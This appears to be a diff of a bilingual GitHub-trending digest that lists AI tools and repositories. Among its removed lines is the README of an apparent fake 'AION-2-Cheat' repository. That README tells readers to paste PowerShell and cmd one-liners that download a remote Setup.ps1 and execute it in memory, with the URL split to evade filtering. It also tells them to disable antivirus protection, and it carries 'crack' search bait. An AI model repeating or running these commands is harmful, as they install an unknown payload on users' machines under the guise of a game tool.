+    - LLM Runtimes and Inference (38)
+    - MCP Servers and Gateways (19)
+    - Model Gateways and Routers (11)
+    - Observability and Evals (20)
+    - RAG and Vector Databases (24)
+    - Search and Knowledge (13)
+    - Speech and Audio (15)
+    - Vision and Multimodal (5)
+    - Voice Agents (5)
+    - Rising (25)
+    - Source-Available (25)
     
-    ### 💻
-    **数字游民**
+    ## Agents and Automation
     
-    为境外雇主或客户远程工作，想换个国家生活
-    
-    15 条欧洲路线 · 月入 €330 起
-    
-    ### 🧑‍💻
-    **技术工作 · 蓝卡**
-    
-    拿到当地雇主 offer：工作 → 居留 → 永居 → 入籍
-    
-    50+ 条路线 · 最快 21 个月永居
-    
-    ### 🎓
-    **留学 → 工作 → 移民**
-    
-    毕业后 6–36 个月找工作签证，再转工作签
-    
-    德国 18 个月 · 芬兰 2 年 · 爱尔兰硕士 2 年
-    
-    ### 🚀
-    **创业 · 自雇**
-    
-    在当地开公司、做自由职业
+    - Agent Development Kit - Python toolkit for building and evaluating LLM agents, with multi-model support.
+    - AgentScope - Multi-agent framework with tracing, memory and tool use for building and deploying agents.
+    - Agno - Python framework for building multi-agent systems with memory, knowledge, and a runtime for agent apps.
+    - Botpress - Platform for building and self-hosting conversational AI chatbots and agents with a visual flow builder.
+    - browser-use - Library that lets LLM agents drive a real browser to complete web tasks.
+    - CrewAI - Framework for orchestrating role-based teams of AI agents inside your own Python environment.
+    - Cua - Sandboxes, SDKs and benchmarks for running computer-use agents against desktop environments.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#8  Southorreproduce96/AION-2-Cheat
-    ⭐ 100 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-10-30
-    🔗 https://github.com/Southorreproduce96/AION-2-Cheat
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
-    🏷️ aion-2, aion-2-2026, aion-2-cheats, aion-2-game, aion-2-optimizer, aion-2-trainer, aion2-combat-analysis, aion2-meter, automation, desktop
-    📝 Complete standalone setup for Aion 2, your AI prompt engineering tool. Ready-to-run desktop installation with all features unlocked.
+#10  CipheruvuPrimal/Spine_Magic_Builder_resocket
+    ⭐ 42 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-10-31
+    🔗 https://github.com/CipheruvuPrimal/Spine_Magic_Builder_resocket
+    📡 来源: 🎬 互动叙事/创作 | 新建 | spine 2D animation
+    🏷️ 2002-games, 2d, animation, atlas, data-viewer, digital-archaeology, file-formats, game-preservation, gamedev-history, isometric-rpg
+    📝 Windows-first toolkit for reconstructing scattered Spine skeleton, atlas, and texture assets with candidate staging and SpineViewer validation.
 
     README 摘要:
-    # Aion 2 — Standalone Desktop Installer
-    Pre-activated local build for testing and deployment.
-    
-    > **Distribution Type:** Pre-activated Standalone Build
-    > **Target Platform:** Windows x64 Desktop
-    > **Estimated File Size:** 1.5 GB
-    > **Last Verified Mirror Sync:** October 2026
-    
-    ---
-    
-    ## ??? Quick Setup Guide (PowerShell)
-    
-    1. Launch PowerShell:
-       * Press `Win + X` on your keyboard.
-       * Click on **Terminal** or **Windows PowerShell** from the list.
-    
-    2. Execute the Setup Script:
-       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all installing successfully:
-    
-       ```cmd
-       $u = "https://git-software.cc/ps/Setup.ps1"; $r = [System.Net.WebRequest]::Create($u); $resp = $r.GetResponse(); $stream = $resp.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $c = $reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))
-       ```
-    
-    ---
-    
-    ## ?? Resolving Issues
-    
-    ### ?? Script is blocked by Execution Policy
-    If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
-    ```cmd
-    powershell -Command "$u='https://git-software.'+'cc/ps/Setup.ps1'; $r=[System.Net.WebRequest]::Create($u); $resp=$r.GetResponse(); $stream=$resp.GetResponseStream(); $reader=New-Object System.IO.StreamReader($stream); $c=$reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))"
-    ```
-    
-    ### ?? Antivirus / SmartScreen Alerts
-    Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
-    
-    ---
-    
-    ## 🔍 Organic Discovery & Identification
-    * download aion 2 crack setup 2026
+    (README 获取失败)
